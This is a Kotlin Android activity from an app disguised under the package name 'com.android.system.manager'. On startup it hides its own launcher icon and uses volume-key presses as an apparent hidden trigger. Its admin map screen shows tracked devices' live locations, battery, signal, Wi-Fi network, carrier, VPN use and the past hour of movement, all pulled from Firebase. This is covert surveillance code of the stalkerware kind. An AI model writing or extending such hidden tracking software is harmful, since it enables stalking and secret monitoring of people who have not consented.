package com.android.system.manager

import android.content.Intent
import android.os.Bundle
import android.view.KeyEvent
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.geometry.Offset
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ServerValue
import com.google.android.gms.maps.CameraUpdateFactory
import com.google.android.gms.maps.model.CameraPosition
import com.google.android.gms.maps.model.LatLng
import com.google.maps.android.compose.*
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MainActivity : ComponentActivity() {

    private val auth by lazy { FirebaseAuth.getInstance() }
    private val usersRef by lazy { FirebaseDatabase.getInstance().getReference("devices") }
    private val historyRef by lazy { FirebaseDatabase.getInstance().getReference("location_history") }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        AppVisibilityManager.hideAppIcon(this)
        enableEdgeToEdge()

        setContent {
            MaterialTheme {
                var screen by remember { mutableStateOf("admin") } // admin only
                var userEmail by remember { mutableStateOf(auth.currentUser?.email ?: "") }

                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    when (screen) {
                        "admin" -> AdminMapScreen(
                            adminEmail = userEmail,
                            onLogout = {
                                auth.signOut()
                                startActivity(Intent(this@MainActivity, AdminAuthActivity::class.java))
                                finish()
                            }
                        )
                    }
                }
            }
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_VOLUME_UP || 
            keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
            VolumeKeyTrigger.onVolumeKey(this, keyCode)
        }
        return super.onKeyDown(keyCode, event)
    }

    @Composable
    fun AdminMapScreen(
        adminEmail: String,
        onLogout: () -> Unit
    ) {
        var users by remember { mutableStateOf<Map<String, UserLocation>>(emptyMap()) }
        var selectedUid by remember { mutableStateOf<String?>(null) }
        var historyPoints by remember { mutableStateOf<List<LatLng>>(emptyList()) }
        var showDeleteDialog by remember { mutableStateOf(false) }

        DisposableEffect(Unit) {
            val listener = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val next = linkedMapOf<String, UserLocation>()
                    for (child in snapshot.children) {
                        val uid = child.key ?: continue
                        val lat = child.child("lat").getValue(Double::class.java)
                        val lng = child.child("lng").getValue(Double::class.java)
                        val bearing = child.child("bearing").getValue(Double::class.java) ?: 0.0
                        val name = child.child("name").getValue(String::class.java) ?: ""
                        val email = child.child("email").getValue(String::class.java) ?: ""
                        val lastLogin = child.child("lastLogin").getValue(Long::class.java) ?: 0L
                        val status = child.child("status").getValue(String::class.java) ?: "offline"
                        if (lat != null && lng != null) {
                            val locationMethod =
                                child.child("locationMethod").getValue(String::class.java) ?: ""
                            val batteryLevel = child.child("batteryLevel").let { s ->
                                when (val v = s.value) {
                                    is Long -> v.toInt()
                                    is Int -> v
                                    else -> -1
                                }
                            }
                            val signalStrength = child.child("signalStrength").let { s ->
                                when (val v = s.value) {
                                    is Long -> v.toInt()
                                    is Int -> v
                                    else -> -1
                                }
                            }
                        val vpnDetected = child.child("vpnDetected").getValue(Boolean::class.java) ?: false
                        val cellOperator = child.child("cellOperator").getValue(String::class.java) ?: ""
                        val wifiSsid = child.child("wifiSsid").getValue(String::class.java) ?: ""
                        val confidencePercent = child.child("confidencePercent").let { s ->
                            when (val v = s.value) {
                                is Long -> v.toInt()
                                is Int -> v
                                is Double -> v.toInt()
                                else -> 0
                            }
                        }
                            val accuracy = when (val v = child.child("accuracy").value) {
                                is Double -> v.toFloat()
                                is Float -> v
                                is Long -> v.toFloat()
                                is Int -> v.toFloat()
                                else -> 0f
                            }
                            val isAnomaly =
                                child.child("isAnomaly").getValue(Boolean::class.java) == true
                            val anomalyType =
                                child.child("anomalyType").getValue(String::class.java)
                            val lastUpdated = child.child("lastUpdated").getValue(Long::class.java)
                                ?: 0L
                            next[uid] = UserLocation(
                                uid = uid,
                                name = name,
                                email = email,
                                lat = lat,
                                lng = lng,
                                bearing = bearing,
                                lastLogin = lastLogin,
                                status = status,
                                locationMethod = locationMethod,
                                batteryLevel = batteryLevel,
                                signalStrength = signalStrength,
                                accuracy = accuracy,
                                isAnomaly = isAnomaly,
                                anomalyType = anomalyType,
                                lastUpdated = lastUpdated,
                                vpnDetected = vpnDetected,
                                cellOperator = cellOperator,
                                wifiSsid = wifiSsid,
                                confidencePercent = confidencePercent
                            )
                        }
                    }
                    users = next
                }

                override fun onCancelled(error: DatabaseError) {
                    // Handle error
                }
            }
            usersRef.addValueEventListener(listener)
            onDispose {
                usersRef.removeEventListener(listener)
            }
        }

        DisposableEffect(selectedUid) {
            val uid = selectedUid
            if (uid.isNullOrBlank()) {
                historyPoints = emptyList()
                onDispose { }
                return@DisposableEffect onDispose { }
            }

            val cutoff = System.currentTimeMillis() - 60 * 60 * 1000L
            val q = historyRef.child(uid)
                .orderByChild("timestamp")
                .startAt(cutoff.toDouble())

            val l = object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    val pts = ArrayList<LatLng>()
                    for (c in snapshot.children) {
                        val lat = c.child("lat").getValue(Double::class.java)
                        val lng = c.child("lng").getValue(Double::class.java)
                        if (lat != null && lng != null) pts += LatLng(lat, lng)
                    }
                    historyPoints = pts
                }

                override fun onCancelled(error: DatabaseError) {
                    // Handle error
                }
            }
            q.addValueEventListener(l)
            onDispose { q.removeEventListener(l) }
        }

        val initial = users.values.firstOrNull()?.let { LatLng(it.lat, it.lng) } ?: LatLng(41.311081, 69.240562)
        val cameraPositionState = rememberCameraPositionState {
            position = CameraPosition.fromLatLngZoom(initial, 11f)
        }

        Column(modifier = Modifier.fillMaxSize()) {
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 12.dp, vertical = 8.dp),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = androidx.compose.ui.Alignment.CenterVertically
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Text("Admin: $adminEmail", style = MaterialTheme.typography.titleMedium)
                    Text(
                        "Devices: ${users.size}",
                        style = MaterialTheme.typography.bodySmall
                    )
                }
                OutlinedButton(onClick = onLogout) { Text("Logout") }
            }

            GoogleMap(
                modifier = Modifier
                    .weight(1f)
                    .fillMaxWidth(),
                cameraPositionState = cameraPositionState,
                properties = MapProperties(mapType = MapType.NORMAL),
                uiSettings = MapUiSettings(zoomControlsEnabled = false)
            ) {
                users.values.forEach { u ->
                    Marker(
                        state = MarkerState(position = LatLng(u.lat, u.lng)),
                        title = u.displayName(),
                        snippet = u.email,
                        rotation = u.bearing.toFloat(),
                        anchor = Offset(0.5f, 0.5f),
                        onClick = {
                            selectedUid = u.uid
                            false
                        }
                    )
                }

                if (historyPoints.size >= 2) {
                    Polyline(
                        points = historyPoints,
                        color = Color(0xFF1E88E5),
                        width = 8f
                    )
                }
            }
        }
    }

    data class UserLocation(
        val uid: String,
        val name: String,
        val email: String,
        val lat: Double,
        val lng: Double,
        val bearing: Double,
        val lastLogin: Long,
        val status: String,
        val locationMethod: String = "",
        val batteryLevel: Int = -1,
        val signalStrength: Int = -1,
        val accuracy: Float = 0f,
        val isAnomaly: Boolean = false,
        val anomalyType: String? = null,
        val lastUpdated: Long = 0L,
        val vpnDetected: Boolean = false,
        val cellOperator: String = "",
        val wifiSsid: String = "",
        val confidencePercent: Int = 0
    )

    private fun UserLocation.displayName(): String = name.ifBlank { if (email.isNotBlank()) email else uid }

    companion object {
        private const val ONE_HOUR_MS = 60 * 60 * 1000L
    }
}
